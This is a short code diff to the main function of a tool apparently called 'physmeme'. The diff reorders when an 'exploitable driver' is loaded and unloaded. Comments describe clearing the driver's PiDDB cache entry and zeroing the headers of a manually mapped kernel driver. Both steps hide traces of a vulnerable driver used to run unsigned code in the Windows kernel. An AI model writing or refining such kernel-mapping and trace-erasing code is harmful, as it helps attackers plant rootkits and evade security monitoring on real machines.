@@ -20,18 +20,14 @@ int __cdecl main(int argc, char** argv)
 	}
 
 	physmeme::drv_image image(drv_buffer);
-	physmeme::load_drv();
-	physmeme::kernel_ctx ctx;
 
-	//
-	// unload exploitable driver
-	//
-	if (!physmeme::unload_drv())
+	if (!physmeme::load_drv())
 	{
-		perror("[!] unable to unload driver... all handles closed?\n");
+		perror("[!] unable to load driver....\n");
 		return -1;
 	}
-	printf("[+] unloaded exploitable driver....\n");
+
+	physmeme::kernel_ctx ctx;
 
 	//
 	// shoot the tires off piddb cache entry.
@@ -108,6 +104,18 @@ int __cdecl main(int argc, char** argv)
 	// zero driver headers
 	//
 	ctx.zero_kernel_memory(pool_base, image.header_size());
+
+	//
+	// unload exploitable driver
+	//
+	physmeme::unmap_all(); // just in case there are any left over physical pages mapped...
+	if (!physmeme::unload_drv())
+	{
+		perror("[!] unable to unload driver... all handles closed?\n");
+		return -1;
+	}
+
+	printf("[+] unloaded exploitable driver....\n");
 	printf("[=] press enter to close\n");
 	std::cin.get();
 }
